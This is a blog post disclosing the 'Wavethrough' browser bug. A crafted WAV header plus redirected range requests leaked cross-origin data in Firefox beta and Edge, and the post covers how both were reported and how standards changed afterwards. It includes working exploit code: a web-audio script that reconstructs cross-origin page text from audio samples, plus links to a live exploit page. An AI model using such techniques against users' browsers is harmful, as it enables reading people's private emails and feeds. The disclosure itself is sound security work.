---
title: I discovered a browser bug
date: 2018-06-20 14:17:41
summary: I accidentally discovered a huge browser security bug. Here's what it
  does, and how I discovered it…
mindframe: ''
image: ''
meta: ''
---

I accidentally discovered a huge browser bug a few months ago and I'm pretty excited about it. Security engineers always seem like the "cool kids" to me, so I'm hoping that now I can be part of the club, and y'know, get into the special parties or whatever.

I've noticed that a lot of these security disclosure things are only available as PDFs. Personally, I prefer the web, but if you're a SecOps PDF addict, check out [the PDF version of this post](asset-url:./wavethrough.pdf).

Oh, I guess the vulnerability needs an extremely tenuous name and logo right? Here goes:

<svg viewBox="0 0 49.6 88.3" style="display: block; width: 198px; margin: 50px auto;">
  <path fill="#8E8E8E" d="M14.3 29.3v-10c0-5.7 4.7-10.4 10.4-10.4s10.4 4.7 10.4 10.4c0 2.4 2 4.4 4.4 4.4 2.4 0 4.4-2 4.4-4.4a19.2 19.2 0 1 0-38.4-.1v10"/>
  <path fill="#D67500" d="M6.6 29.2H43c3.7 0 6.7 3 6.7 6.7v35.3c0 3.7-3 6.7-6.7 6.7H6.6c-3.7 0-6.7-3-6.7-6.7V54.3h.9v-1.8H0V35.8c0-3.6 2.9-6.6 6.6-6.6zm9.7 2.4v11h-1.2v21.1h1.2v11h1.2v-6.2h1.2V38.8h-1.2v-7.2h-1.2zm4.2 6.1v31h1.2v-31h-1.2zM23 45v17.6h1.2v-6h1.2V51h-1.2v-6H23zm-10.9 1.2V51h-1.2v4.2h1.2v6.1h1.2v-15h-1.2zm16.9 0v14.5h1.2V46.2H29zm-3 1.2v12.7h1.2V47.4H26zm6.1 3v6.1h1.2v-1.2h1.2v-3.6h-1.2v-1.2h-1.2zm4.2 1.8v2.4h1.2v-2.4h-1.2zM3 52.5v1.8h1.2v-1.8H3zm2.4 0v1.8h1.2v-1.8H5.4zm2.7 0v1.8h1.2v-1.8H8.1zm31.2 0v1.8h1.2v-1.8h-1.2zm2.4 0v1.8H43v-1.8h-1.3zm2.8 0v1.8h1.2v-1.8h-1.2zm3.6 0v1.8h1.2v-1.8h-1.2z"/>
  <path d="M.4 81h1.1l.5 4.4.1 1h.1l.1-1.2.8-4.2H4l.8 4.3.1 1.2H5l.1-1 .3-4.5h1.1l-1 7.3H4.3l-.6-3.5-.2-1.5h-.1l-.2 1.5-.6 3.5H1.5L.4 81zM8.1 81h1.3l1.4 7.3H9.6L9.4 87H8l-.2 1.3H6.7L8.1 81zm1.1 5.1l-.5-3.7-.5 3.7h1zM10.9 81H12l.8 5.8.8-5.8h1.1l-1.3 7.3h-1.3L10.9 81zM15.5 81h2.7v.9h-1.6V84h1.2v.9h-1.2v2.5h1.6v.9h-2.8V81zM19.8 81.8h-1.2V81H22v.9h-1.2v6.5h-1.1v-6.6zM22.8 81h1.1v3h1.3v-3h1.1v7.3h-1.1v-3.4h-1.3v3.4h-1.1V81zM27.6 81h1.7l.5.1.5.2.4.4.3.6.1.8v.2l-.2 1.4c-.2.4-.4.6-.7.8l1.2 2.9h-1.2l-1-2.7h-.4v2.7h-1.1V81zm1.3 3.7l.5-.1.3-.2.2-.4.1-.6v-.6l-.1-.5-.2-.3-.3-.2-.5-.1h-.2v3h.2zM33.7 88.4h-.4l-.4-.1-.4-.3-.3-.4-.2-.7-.1-.9v-2.6l.1-.9.2-.7.3-.4.4-.2.4-.1h.8l.4.1.4.2.3.4.2.7.1 1v2.6l-.1.9-.2.7-.3.4-.4.3-.4.1c-.2-.2-.3-.1-.4-.1zm0-.9l.3-.1.2-.2.1-.4V83v-.6l-.1-.4-.2-.2-.3-.1-.3.1-.2.2-.1.4v4.5l.1.4.2.2h.3zM36.6 81h1.1v6l.1.4.2.2.3.1.3-.1.2-.2.1-.4v-6H40v5l-.1.9-.2.6-.3.4-.4.2-.4.1h-.7l-.4-.1-.4-.2-.3-.4-.2-.6-.1-.9v-5zM42.8 88.4h-.3l-.4-.1-.4-.3-.3-.4-.2-.7-.1-.9v-2.6l.1-.9.2-.7.3-.4.4-.2.4-.1h.4l.8.1.5.3.3.5.1.6v.4l-.1.4h-.9V83c0-.8-.2-1.2-.6-1.2l-.3.1-.2.2-.1.4V87l.1.4.2.2.3.1.3-.1.2-.3.1-.4v-1.5H43v-.7h1.7v3.7H44l-.1-.7a1 1 0 0 1-.5.6l-.6.1zM45.8 81h1.1v3h1.3v-3h1.1v7.3h-1.1v-3.4h-1.3v3.4h-1.1V81z"/>
</svg>

Why Wavethrough? Well, it involves wave audio, and data is allowed through that shouldn't be. Tenuous enough?

All the browser security bugs I cover in this post have since been fixed. Make sure your browser is up to date.

As I said, I stumbled into this whole thing by accident. Here's how it happened from the start:

# Media via a service worker didn't quite work

If you have a service worker like this:

```js
addEventListener('fetch', (event) => {
  event.respondWith(fetch(event.request));
});
```

…the idea is you shouldn't see any behavioural difference between this and no-service-worker. Unfortunately cross-origin `<video>` and `<audio>` doesn't quite behave the same. Seeking doesn't work, and sometimes it fails entirely.

`<video>` and `<audio>` are different from most web APIs in that they use range requests. Ok, let's push that onto the stack:

## Range requests

Usually when the browser makes a request, it's asking for the whole resource. However, HTTP defines the [`Range` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Range) and [partial content responses](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/206). For example, the request may have the following header:

```
Range: bytes=50-100
```

…which is requesting bytes 50-100 (inclusive) of the resource. The server may then respond with a `206 Partial Content`, and a header like this:

```
Content-Range: bytes=50-100/5000
```

…indicating it's returning bytes 50-100 (inclusive) of a 5000 byte resource.

Browsers use this for resuming downloads, but it's also used by media elements if the user seeks the media, so it can go straight to that point without downloading everything before it, or to pick up metadata if it's one of those annoying media formats that has important metadata at the end of the file.

Unfortunately, via a service worker, that `Range` header was going missing (dun-dun-dunnnnnnnnn!). This is because media elements make what we call "no-cors" requests. Let's push that onto the stack too:

## No-cors requests

If you `fetch()` something from another origin, that origin has to give you permission to view the response. By default the request is made without cookies, and if you want cookies to be involved, the origin has to give extra permission for that. If you want to send fancy headers, the browser checks with the origin first, before making the request with the fancy headers. This is known as [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS).

However, some APIs couldn't give a shit about all that. They make "no-cors" requests, so the checks above don't happen. If you make a no-cors request to another origin, it's sent with cookies and you get back an "opaque" response. Developers shouldn't be able to access the data of an opaque response, but particular APIs may interpret that data behind the scenes.

Take `<img>` for instance. If you include an `<img>` that points to another origin, it'll make a no-cors request to that origin using that origin's cookies. If valid image data is returned, it'll display on your site. Although you can't access the pixel data of that image, data is still leaked through the `width` and `height` of the image. You also know whether or not you received valid image data.

Let's say there's an image that's only accessible if the user is logged into a particular site. An attacker can tell from the load/error event of the `<img>` whether that user is logged into that site. The user's privacy has been compromised. Yaaaay.

Allowing this to happen is a mistake, but we have decades of content depending on this behaviour. We can't simply prevent it, but we can add things to mitigate it in certain situations. If we started the web again, everything would require something like CORS.

It isn't just images either. Classic non-module scripts, CSS, and media elements also make no-cors requests by default.

## No-cors + ranges + service workers

So, back to our pass-through service worker:

```js
addEventListener('fetch', (event) => {
  event.respondWith(fetch(event.request));
});
```

A media element would make a no-cors request with a `Range` header. When it's passed to `fetch()` the request object is checked. At this point fetch sees a header (`Range`) that isn't allowed in no-cors requests, and silently removes it. Therefore the server doesn't see the `Range` header, so it just responds with a standard 200 response.

Why is this header filtered? Well, no one standardised how they were supposed to work. Actually that deserves its own heading:

# Range requests were never standardised

They're standardised in HTTP, but not by HTML. We know what the headers look like, and when they should appear, but there's nothing to say what a browser should actually do with them.

- Should all media requests be range requests, or just additional requests?
- What happens if the returned range ends sooner/later than what the browser asked for?
- What happens if the returned range starts sooner/later than what the browser asked for?
- What happens if a range is requested but the server returns a normal 200 response?
- What happens if a range is requested but the server returns a redirect?
- What happens if the underlying content appears to have changed between requests?
- What happens if a normal request is made but a 206 partial is returned?

None of this is defined, so browsers all kinda do different things. Yay.

We couldn't just add the `Range` header to [the safelist](https://fetch.spec.whatwg.org/#cors-safelisted-request-header), as developers would be able to set it to values the browser would never usually send, and that presents a security risk.

Also, with a service worker in the middle, you can respond to a request however you want, even if it's a no-cors request to another origin. For example, you can have an `<img>` on your page that points to `facebook.com`, but your service worker could return data from `twitter.com`. This isn't a problem as you can only lie to yourself.

However, media elements piece multiple responses together and treat it as a single resource, and that opens up an interesting attack vector: Can known data be mixed with unknown data to reveal the content of the unknown data?

I pretended to be a hacker and [wrote down all the attacks I could think of](https://github.com/whatwg/fetch/issues/144#issuecomment-368040980), and [Anne van Kesteren](https://twitter.com/annevk) pointed out that some of them were possible without a service worker, as you can do similar things with redirects. So, I investigated how browsers currently handle these situations.

# Mixing known and unknown data

<style>
.chat {
  overflow: hidden;
  background: #ebe4db;
  padding: 17px 17px 7px;
  margin: 0 -20px;
  line-height: 1.3;
  display: flex;
  flex-flow: column;
  align-items: flex-start;
}

@media (min-width: 530px) {
  .chat {
    margin: 0 0 0 -32px;
    padding-left: 32px;
  }
}

.chat-item,
.chat-direction {
  position: relative;
  background: #fff;
  padding: 7px 10px;
  margin: 0 40px 10px 0;
  border-radius: 0 7px 7px 7px;
  -webkit-filter: drop-shadow(0 1px 1px rgba(0,0,0,0.2));
  filter: drop-shadow(0 1px 1px rgba(0,0,0,0.2));
}

.page-chat {
  background: #e1ffc7;
  border-radius: 7px 0 7px 7px;
  margin: 0 0 10px 40px;
  align-self: flex-end;
}

.chat-item::before {
  content: '';
  position: absolute;
  top: 0;
  right: 100%;
  border: solid 5px #fff;
  border-top-width: 15px;
  border-width: 6px 4px;
  border-color: #fff #fff transparent transparent;
}

.page-chat::before {
  top: 0;
  left: 100%;
  border-color: #e1ffc7 transparent transparent #e1ffc7;
  width: 0;
}

.chat-item .author {
  display: block;
  color: #ff702c;
  font-weight: bold;
  font-size: 0.9rem;
  margin: 0 0 5px 0;
}

.server-chat .author {
  color: #4dbaba;
}

.page-chat .author {
  color: #778868;
}

.chat-item .author span {
  color: transparent;
}

.chat-item .time {
  float: right;
  font-size: 0.9rem;
  position: relative;
  top: 5px;
  left: 3px;
  color: rgba(0,0,0,0.5);
  margin-left: 10px;
}

.chat-direction {
  border-radius: 7px;
  background: #d4eaf4;
  text-transform: uppercase;
  align-self: center;
  margin: 5px 0 15px 0;
  font-size: 0.9rem;
  line-height: 1;
  padding: 10px;
  color: #666;
}

.chat-nowrap {
  white-space: nowrap;
}
</style>

<div class="chat">
  <p class="chat-item page-chat">
    <span class="author">Page<span>:</span></span>
    Hey, this audio tag needs audio data from <span class="chat-nowrap">"/whatever.wav"</span>.
    <span class="time">10:24</span>
  </p>

  <p class="chat-item cache-chat">
    <span class="author">evil.com<span>:</span></span>
    No problem, here's 44 bytes of data.
    <span class="time">10:24</span>
  </p>

  <p class="chat-item page-chat">
    <span class="author">Page<span>:</span></span>
    Cool, I see this is a PCM WAV header, 1 channel, 44100hz, 8bit, 30mins long. However, that's not enough data, can you send me <span class="chat-nowrap">Range: 44-</span> please?
    <span class="time">10:24</span>
  </p>

  <p class="chat-item cache-chat">
    <span class="author">evil.com<span>:</span></span>
    Oh, get that from <span class="chat-nowrap">facebook.com/</span> instead.
    <span class="time">10:24</span>
  </p>

  <p class="chat-item page-chat">
    <span class="author">Page<span>:</span></span>
    Ok <span class="chat-nowrap">facebook.com/</span>, here are your cookies, can I get <span class="chat-nowrap">Range: 44-</span> please?
    <span class="time">10:24</span>
  </p>

  <p class="chat-item server-chat">
    <span class="author">facebook.com<span>:</span></span>
    Sure, here you go…
    <span class="time">10:25</span>
  </p>
</div>

I created a site that does the above. I used a PCM wav header because everything after the header is valid data, and whatever Facebook returned would be treated as uncompressed audio.

In my opinion, browsers should reject the response from Facebook, as the media element shouldn't allow mixing visible and opaque data. Nor should it allow opaque data from multiple sources, although that isn't happening here.

Chrome and Safari rejected as soon as they saw the redirect. This is safe, although they would need to check the response if a service worker was in the middle too, since that can result in a response from somewhere else without a redirect occurring.

However…

# Firefox security bug

Beta and nightly versions of Firefox at the time allowed the redirect, combine the responses together, and expose the duration of the audio through `mediaElement.duration`.

Because I set the frequency, bit depth, and channel count of the audio in the header, I could determine the length of the cross-origin resource from the audio length using ✨basic maths✨.

```js
const contentLength =
  audio.duration * /* WAV frequency */ 44100 + /* WAV header length */ 44;
```

<figure class="full-figure">
<div class="video"><iframe src="https://www.youtube.com/embed/D5wu_za7ows?rel=0&amp;showinfo=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe></div>
<figcaption>Length of sensitive resource revealed in Firefox 59.0b9</figcaption>
</figure>

It looks like the size isn't detected exactly, but Google returns a range, so the reported size includes the extra 44 bytes that are missing from the start (the WAV header).

And here's [a link to the attack](https://jewel-chair.glitch.me/exploit.html?url=https://www.google.com/gmail/about/), which works in Firefox 59.0b9 at least.

Leaking the length of a resource may not sound like a big deal, but consider an endpoint like `gender.json`. The content length can give a lot away. Also see [Timing attacks in the Modern Web](https://tom.vg/papers/timing-attacks_ccs2015.pdf) (PDF, heh) which demonstrates the amount of information content-length can leak.

Firefox handled this _brilliantly_. Within three hours [Paul Adenot](https://twitter.com/padenot?lang=en) replied to [the bug report](https://bugzilla.mozilla.org/show_bug.cgi?id=1441153#c4), confirming it, and digged into other potential leaks (there weren't any). I was able to engage with engineers directly on how the issue should be fixed, which was important as I was planning how to standardise the mitigation.

Since this was a regression caught in beta, Firefox were able to patch it before it reached stable.

# Edge security bug

Edge suffered from the same kind of bug, but with a huge twist. Firstly, it didn't care if the other server returned a 206 or not. Secondly, and this is the big one, it allowed the resulting audio to pass through the web audio API. The web audio API is like the `<canvas>` equivalent for audio, meaning I could monitor the samples being played:

```js
// Get the audio element.
const audio = document.querySelector('audio');
// Create a web audio context.
const ac = new AudioContext();
// Connect the two.
const source = ac.createMediaElementSource(audio);
// Create a script processor.
// This lets me transform the audio data. I don't really care
// about transforming, I just want to collect the data.
const scriptNode = ac.createScriptProcessor(256, 1, 1);
const datas = [];

scriptNode.onaudioprocess = (event) => {
  const inputData = event.inputBuffer.getChannelData(0);
  // Store the audio data
  if (!audio.paused) datas.push(inputData.slice());
};

// Connect the processor.
source.connect(scriptNode);
scriptNode.connect(ac.destination);

audio.addEventListener('ended', (event) => {
  source.disconnect(scriptNode);
  scriptNode.disconnect(ac.destination);

  // Now I can look at all the data received, and turn it from
  // audio sample data, back into bytes, then into a string.
  const str = datas.reduce((str, data) => {
    // Each sample is -1 to 1.
    // In the original wav it was 16-bits per sample,
    // so I map each value to a signed 16-bit value.
    const ints = Array.from(data).map((num) => Math.round(num * 32768));
    // Then put that into a typed array.
    const int16 = new Int16Array(ints);
    // But, assuming utf-8, I need unsigned 8-bit chunks:
    const bytes = new Uint8Array(int16.buffer);
    // Now I can create a string from that.
    return (
      str +
      Array.from(bytes)
        .map((b) => String.fromCharCode(b))
        .join('')
    );
  }, '');

  // Output the data.
  document.body.appendChild(document.createTextNode(str));
});
```

And here's what that looks like:

<figure class="full-figure">
<div class="video"><iframe src="https://www.youtube.com/embed/4yanGsSk8rw?rel=0&amp;showinfo=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe></div>
<figcaption>Reading cross-origin content in Edge</figcaption>
</figure>

The text you see is the content of BBC News. Since the request is made with cookies, the content is the "logged in" view, although I wasn't logged in for the demo.

It's kinda pathetic how excited I got about this, but this is a _huge_ bug. It means you could visit my site in Edge, and I could read your emails, I could read your Facebook feed, all without you knowing.

And here's [a link to the attack](http://jewel-chair.glitch.me/exploit.html?url=http://www.bbc.co.uk/news&initialLen=90000&totalLength=*&freq=44100&bits=16&useWebAudio=1). If this works in your version of Edge, **update your browser immediately**.

## Reporting the bug to Microsoft

You're about to witness a boy in his mid-30s having a massive entitled whinge. If you want to avoid that, skip this section, but I really need to get it off my chest. The experience I had with Microsoft was very different to Firefox.

I filed the issue in [Edge's bug tracker](https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/) on March 1st and notified secure@microsoft.com. I got an email from Microsoft security later that day saying that they don't have access to Edge's bug tracker, and asked if I could paste the details into an email for them. So yeah, Microsoft's security team don't have visibility into Edge security issues. Anyway, I sent them the details of the exploit over plain email. **Update:** Turns out when you file a security bug with Edge, you get a special URL only the reporter can access. I didn't know this was the case, and it didn't seem like the security contact at MS knew either.

The next day they said they couldn't investigate the issue unless I provided the source code. C'mon folks, the "view source" button is right there. Anyway, I sent them the source. Then there was _20 days of silence_.

At this point I had no idea if they were able to understand the issue, or if they knew how serious it was. I pointed out that the attack could be used to read people's private messages, but received no response.

**Update:** 16 days into the silence I sent a further email "Is it ok if I present this exploit at a conference next week?". I wasn't booked to speak at any conference, I was just trying to elicit a response, to get some indication that the lights were on. It didn't work. I recently found out [Microsoft characterised this as a threat](https://twitter.com/jacobrossi/status/1009886729711390720).

I asked [Jacob Rossi](https://twitter.com/jacobrossi) and [Patrick Kettner](https://twitter.com/patrickkettner) (awesome folks who work on the Edge team) if they could chase it internally. After they did, I finally got a reply from Microsoft security saying they were "developing a fix", with no further detail.

If you find a bug like this, you're eligible for a bounty. I asked if I could nominate a charity or two to receive the bounty. There was no response. 14 days of silence.

I asked Patrick to chase them again (thanks Patrick!), and they replied saying they wouldn't be able to give the bounty to charity, despite their public docs saying otherwise. Apparently the rules changed at some point, and I was looking at old docs. Whatever. Thankfully Google are ok with me taking the money directly, and will match what I donate (I found the bug while at work, so I was worried about the legal implications of taking the money. I'm sure there'll be some tax complications too, ugh).

I wasn't getting any progress update, or any details on how they planned to fix it (which would have been useful from a standards perspective). So, I [shitposted on Twitter](https://twitter.com/jaffathecake/status/984339892183490560), and [Jun Kokatsu kinda sniped back](https://twitter.com/shhnjk/status/987261708971462657). Jun is a security engineer at Edge, and we got chatting over DMs. And holy shit, this is who I should have been talking to all along.

Jun told me there had been a lot of activity around the bug internally, and they're looking to improve visibility of this kind of stuff to the reporter. We were able to discuss what the fix would look like, and how that would work with a service worker in the middle. I really can't stress enough how helpful Jun has been.

Microsoft released a patch for the bug, and published [CVE-2018-8235](https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2018-8235). I found out about this through Jun. I haven't heard anything through the official channel.

On June 7th I asked the official contact for an update on the bug bounty, since they haven't confirmed any of that yet. I've yet to receive a reply. **Update**: Shortly after publishing this they contacted me to say I qualify for the bounty.

Ok, that was a lot of complaining, but I really want Microsoft to look at the experience I had with Firefox and learn from it. Security issues like this put their users at huge risk, and they need to ensure reporting these things isn't more effort than it's worth.

# Standards are important

I've covered two browser security issues here, but these bugs started when browsers implemented range requests for media elements, which wasn't covered by the standard. These range requests were genuinely useful, so all browsers did it by copying each others behaviour, but no one integrated it into the standard.

The result is the browsers all behave slightly differently, and some ended up with security issues.

This is why standards are important. Chrome had [a similar security issue a few years ago](https://sirdarckcat.blogspot.com/2015/10/range-responses-mix-match-leak.html), but instead of just fixing it in Chrome, the fix should have been written into a standard, and [tests](https://github.com/web-platform-tests/wpt) should have been written for other browsers to check against.

I've been working to improve standards here. Range requests are now [able to pass through a service worker safely](https://fetch.spec.whatwg.org/#privileged-no-cors-request-header-name) according to the spec. The next step is to specify the request and response handling for media elements.

Also, [CORB has been added to fetch](https://fetch.spec.whatwg.org/#corb). The aim here is to reduce the capabilities of no-cors while retaining compatibility with the web. For instance:

```html
<img src="https://facebook.com/secret-data.json" />
```

Previously, the above would fail to load, but the response would be in the same process as the rest of the page. This is really bad thing given Spectre and Meltdown. But CORB will prevent that resource entering the page process, since its content (JSON) isn't something that can be loaded by any no-cors API.

CORB also prevents the attack outlined in this post, as it wouldn't allow `text/html` content to enter the process as the result of a no-cors request.

And that's it! I now have a CVE number I can have etched on my grave. And I'm going to sit here and patiently await my invite to all the cool security parties.

<small>Thanks to [Sandra](https://thenounproject.com/term/sound/1065225/) and [Monica Stromann](https://thenounproject.com/term/padlock/174117/#_=_), whose icons I butchered to create the Wavethrough logo. Also thanks to [Mathias Bynens](https://twitter.com/mathias), [Jun Kokatsu](https://twitter.com/shhnjk), and [Paul Lewis](https://twitter.com/aerotwist) for proofreading & corrections.</small>
